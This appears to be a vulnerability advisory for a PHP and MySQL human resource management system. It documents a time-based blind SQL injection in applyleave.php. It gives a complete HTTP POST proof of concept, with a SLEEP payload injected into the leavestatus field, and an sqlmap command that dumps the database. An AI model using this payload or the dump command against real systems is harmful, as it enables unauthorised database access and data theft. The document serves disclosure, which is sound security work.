# Human Resource Management System Project in PHP and MySQL Free Source Code
#### Submitter: Kha Do

## Vender: SourceCodester

# AFFECTED AND/OR FIXED VERSION


## Vulnerable File
applyleave.php

# PROBLEM TYPE
## Vulnerability Type
SQL Injection

## Impact
The attackers can exploit this vulnerability to gain database privileges, which can result in a large amount of data in the database. If the other party's database has DBA privileges, it may lead to server host privileges being obtained.

# POC
## Payload
```
POST /hrm/user/applyleave.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 149
Origin: http://localhost
Connection: close
Referer: http://localhost/hrm/user/applyleave.php
Cookie: PHPSESSID=2v2v2al4dkd4iir9cl5j7oikvr
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: cyan

leavestatus=5'+AND+(SELECT+1337+FROM+(SELECT(SLEEP(5)))VSgR)+AND+'Kha'%3d'123&reason=+++&startdate=03%2F04%2F2024&enddate=29%2F04%2F2024&Apply=Submit
```
After running this Payload, the data return time is delayed by 5 seconds, indicating that we may have successfully executed **"sleep(5)"**. In this case, the delay may be several times. We will verify it below:
![SQL_Injection](https://github.com/dovankha/CVE-2024-34220/assets/63991630/1d7b6f8d-cbd1-4ab8-b80b-4c90572d5f76)


After running this Payload, the data return time is delayed by 20 seconds, indicating that we may have successfully executed **"sleep(20)"**. In this case, the delay may be several times. We will verify it below:
![SQL_Injection_1](https://github.com/dovankha/CVE-2024-34220/assets/63991630/e5efe86d-e186-4b27-8ed9-edf254fbf640)


## SQLmap
```
sqlmap -r <item request> --dump
```
![sqlmap](https://github.com/dovankha/CVE-2024-34220/assets/63991630/3a5aeab3-e8d7-48fa-acc7-f3363ed05cca)

